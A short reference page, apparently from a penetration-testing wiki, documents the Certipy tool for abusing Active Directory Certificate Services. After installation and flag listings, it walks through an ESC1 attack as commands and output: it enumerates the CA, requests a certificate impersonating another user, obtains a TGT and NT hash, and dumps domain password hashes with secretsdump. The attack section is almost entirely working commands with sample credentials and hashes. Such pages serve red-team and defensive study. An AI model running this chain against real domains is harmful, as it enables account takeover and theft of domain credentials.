---
title : "Certipy"
# pre : ' '
description : "Active Directory Certificate Services enumeration and abuse."
date : 2022-10-11T10:36:25+02:00
# hidden : true
# draft : true
weight : 290
tags : ['Other', 'Active Directory', 'ADCS']
---

---

Active Directory Certificate Services enumeration and abuse.

## Installation

```plain
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip install certipy-ad
```

## Usage

```plain
certipy [-v] [-h] {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template} ...
```

## Flags

```plain
Certipy v4.8.2 - by Oliver Lyak (ly4k)

positional arguments:
  {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template}
                        Action
    account             Manage user and machine accounts
    auth                Authenticate using certificates
    ca                  Manage CA and certificates
    cert                Manage certificates and private keys
    find                Enumerate AD CS
    forge               Create Golden Certificates
    ptt                 Inject TGT for SSPI authentication
    relay               NTLM Relay to AD CS HTTP Endpoints
    req                 Request certificates
    shadow              Abuse Shadow Credentials for account takeover
    template            Manage certificate templates

options:
  -v, --version         Show Certipy's version number and exit
  -h, --help            Show this help message and exit
```

## Examples

For more examples please check the [Github Repo](https://github.com/ly4k/Certipy).

### Finding CA

```plain
$ certipy find -u crypt0rr@offsec.nl -p Welkom1234 -dc-ip 10.10.10.10
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 9 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 8 enabled certificate templates
[*] Trying to get CA configuration for 'CA01-OFFSEC' via CSRA
[*] Got CA configuration for 'CA01-OFFSEC'
[*] Saved BloodHound data to '202210114803_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '202210114803_Certipy.txt'
[*] Saved JSON output to '202210114803_Certipy.json'
```

### Exploiting ESC1

To find the exact Certificate Authority (CA) use `certutil –config – -ping` in CMD (<https://www.cloudservus.com/blog/how-to-find-a-certificate-authority-in-your-active-directory-environment>).

```plain
$ certipy req -u 'crypt0rr.offsec.nl' -p 'Welkom1234' -target 'dc01.offsec.nl' -ca 'CA01-OFFSEC' -template 'ESC1' -upn 'john-da@offsec.nl'
Certipy v4.0.0 - by Oliver Lyak (Ly4k)
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 707
[*] Got certificate with UP 'john-da@offsec.nl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'john-da.pfx'
```

```plain
$ certipy auth -pfx 'john-da.pfx' -dc-ip '10.10.10.11' -username 'john-da' -domain 'offsec.nl'
Certipy v4.0.0 - by Oliver Lyak (ly4k)
[*] Using principal: john-da@offsec.nl
[*] Trying to get TGT.
[*] Got TGT
[*] Saved credential cache to john-da.ccache'
[*] Trying to retrieve NT hash for 'john-da'
[*] Got hash for 'john-da@offsec.nl': aad3b435b51404eeaad3b435b51404ee:caec1e1d755119a15bfb6cd3d5994305
```

```plain
$ secretsdump.py -just-dc -hashes 'aad3b435b51404eeaad3b435b51404ee:caec1e1d755119a15bfb6cd3d5994305' 'offsec.nl/john-da@dc01.offsec.nl'
Impacketv0.10.1.dev1+20220504.120002.d5097759 - Copyright 2022 SecureAuth Corporation
[*] Dumping Domain Credentials (domain\id:rid: lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f859684db2422704e9e4c2cd7e27b07:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[...]
```

## URL List

- [Github.com - Certipy](https://github.com/ly4k/Certipy)
